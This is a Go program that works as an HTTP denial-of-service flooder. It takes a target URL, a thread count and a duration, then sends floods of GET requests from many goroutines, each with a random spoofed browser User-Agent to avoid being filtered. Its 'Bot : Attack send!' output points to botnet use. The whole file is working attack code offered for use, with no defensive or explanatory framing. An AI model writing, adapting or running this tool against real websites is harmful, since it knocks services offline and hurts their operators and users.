package main

import (
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"

	browser "github.com/EDDYCJY/fake-useragent"
)

func main() {
	target := os.Args[1]
	thread, _ := strconv.Atoi(os.Args[2])
	t, _ := strconv.Atoi(os.Args[3])
	fmt.Println("Bot : Attack send!")
	until := time.Now().Add(time.Duration(t) * time.Second)
	for i := 0; i < thread; i++ {
		go func() {
			for time.Until(until) > 0 {
				client := &http.Client{}
				req, _ := http.NewRequest("GET", target, nil)
				req.Header.Set("User-Agent", browser.Random())
				_, err := client.Do(req)
				if err != nil {
					continue
				}
			}
		}()
	}
	time.Sleep(time.Duration(t) * time.Second)
	fmt.Println("Attack end")
}
